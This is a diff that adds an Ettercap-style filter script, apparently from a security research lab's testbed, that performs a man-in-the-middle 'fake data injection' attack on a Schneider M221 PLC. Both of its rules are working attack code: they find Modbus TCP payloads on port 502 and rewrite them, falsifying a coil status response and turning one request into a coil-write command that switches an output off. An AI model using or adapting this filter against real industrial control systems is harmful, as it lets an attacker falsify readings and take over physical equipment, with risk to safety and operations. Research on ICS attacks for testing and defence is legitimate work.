@@ -1,0 +1,28 @@
+#-----------------------------------------------------------------------------
+# Name:        m221_1 filter
+#
+# Purpose:     This filter is used to do the fake data injection attack for the 
+#              Schneider m221 PLC system.(IP 192.168.10.72)<-> 192.168.10.21
+# Author:      Yuancheng Liu
+#
+# Created:     2019/09/09
+# Copyright:   YC @ Singtel Cyber Security Research & Development Laboratory
+# License:     YC
+#-----------------------------------------------------------------------------
+
+# M10 -> Q0.0 Airport LED 
+if (ip.proto == TCP && tcp.src == 502) {
+    if (search(DATA.data ,"\x00\x00\x00\x04\x01\x01\x01\x00")) {
+        replace("\x00\x00\x00\x04\x01\x01\x01\x00", "\x00\x00\x00\x04\x01\x01\x01\x01");
+        msg("Man In The Middle Attack!\n");
+    }
+}
+
+
+if (ip.proto == TCP && tcp.dst == 502 && ip.dst == '172.18.212.123') {
+    msg("IF 1!\n");
+    if (search(DATA.data ,"\x00\x06\x01\x01\x00\x00\x00\x01")) {
+        replace("\x06\x01\x01\x00\x00\x00\x01", "\x08\x01\x0f\x00\x00\x00\x01\x01\x00");
+        msg("turn off  Attack!\n");
+    }
+}
